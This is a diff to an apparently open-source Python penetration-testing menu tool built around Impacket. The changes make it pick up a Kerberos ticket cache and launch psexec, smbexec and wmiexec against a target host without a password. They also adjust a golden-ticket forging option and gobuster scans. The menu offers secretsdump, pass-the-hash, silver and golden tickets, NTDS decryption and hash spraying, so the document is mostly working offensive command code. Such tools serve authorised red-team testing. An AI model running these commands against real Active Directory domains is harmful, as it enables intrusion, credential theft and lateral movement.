@@ -181,11 +181,19 @@ def saveParams():
    return
    
 def privCheck():
-   command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
-   print("[*] Attempting to run secretsdump command...")
-   command(keyPath + "secretsdump.py -k " + DOM.rstrip(" "))
-   print("\n[*] Attempting to run psexec command...")
-   command(keyPath + "psexec.py -k " + DOM.rstrip(" "))
+   command("ls  | grep ccache > ticket.tmp")
+   count = len(open('ticket.tmp').readlines())
+   if count > 1:
+      print("[i] More than one ticket identified, using first in list...")
+   ticket = linecache.getline("ticket.tmp", 1).rstrip("\n")
+   if ticket != "":
+      command("export KRB5CCNAME=" + ticket)
+      print("[*] Checking ticket " + ticket + "...")
+      command(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+      command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+      command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+   else:
+      print("[-] Unable to find a valid ticket...")
    return 
 
 def keys():
@@ -454,7 +462,7 @@ def options():
    print('\u2551' + "(04) Re/Set WEB ADDRESS (16) Dump  DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER (74) Hydra POP3 (84) Telnet " + '\u2551')
    print('\u2551' + "(05) Re/Set USER NAME   (17) NMAP LIVE PORT     (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS (75) Hydra TOM  (85) NetCat " + '\u2551')
    print('\u2551' + "(06) Re/Set PASS WORD   (18) NMap PORT Service  (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH (76) MSF TOMCAT (86) SQSH   " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM HASH   (19) NMap SubDOMAINS    (27) SmbExec (37) Smb Client     (47) HASH Spray     (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM HASH   (19) NMap SubDOMAINS    (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
    print('\u2551' + "(08) Re/Set DOMAIN NAME (20) Nmap Server TIME   (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (68) GoPhishing  (78) RSyncDumpS (88) MySQL  " + '\u2551')
    print('\u2551' + "(09) Re/Set DOMAIN SID                          (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (69) GoBuster    (79) RDeskTop   (89) WinRm  " + '\u2551')
    print('\u2551' + "(10) Re/Set SHARE NAME                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (70) Nikto Scan  (80) XDesktop   (90)        " + '\u2551')
@@ -2015,7 +2023,7 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
+# Details : Menu option selected - GOLDEN TICKET ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
 # Details : Golden Ticket!!
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -2023,9 +2031,9 @@ while True:
    if selection == '50':
       checkParams = testTwo()      
       if checkParams == 0:
-         checkParams = testThree()
+         checkParams = testThree()         
       if checkParams != 1:
-         print("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...\n")
+         print("[*] Trying to create golden TGT for user " + USR.rstrip(" ") + "...")
          if (NTM[:1] != "") & (SID[:1] != ""):
             print("[i] Using HASH value as password credential...")
             command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
@@ -2517,7 +2525,7 @@ while True:
             command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + TIP.rstrip(" ") + " -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50")
          else:
             if (WEB[:5] == "https") or (WEB[:5] == "HTTPS"):
-               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50 -k") 
+               command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u '" + WEB.rstrip(" ") + "' -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50") 
             else: 
                command("gobuster dir -r -U " + USR.rstrip(" ") + " -P " + PAS.rstrip(" ") + " -u " + WEB.rstrip(" ") + " -x " + fileExt + " -f -w /usr/share/dirb/wordlists/common.txt -t 50")
       prompt()
